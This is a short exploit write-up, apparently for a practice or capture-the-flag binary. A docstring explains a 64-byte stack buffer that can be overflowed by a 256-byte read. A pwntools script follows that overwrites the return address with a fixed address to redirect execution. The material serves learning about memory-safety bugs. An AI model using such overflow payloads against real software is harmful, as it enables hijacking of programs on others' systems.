"""
# Vulnerability Analysis & Exploit Write-up: Stack-Based Buffer Overflow (Ret2Win)

## Vulnerability Overview
A stack-based buffer overflow exists in `appVuln.c`.
The program allocates a 64-byte local buffer on the stack but reads up to 256 bytes from standard input
 (`read(STDIN_FILENO, buffer, 256)`). Because input size limits are not properly enforced, extra input overflows the target buffer into neighboring stack structures.

## Stack Layout (x86-64)
Memory addresses grow upwards, but the stack grows downwards toward lower addresses.
Local variables are placed closer to the top of the stack (lower memory addresses) than saved frame data.

"""

from pwn import *
import struct
p= process("./vuln")

add=struct.pack("<Q",0x00401176)
payload= b"A"*72 + add

p.sendlineafter("Input: ",payload)

print(p.recvall().decode())
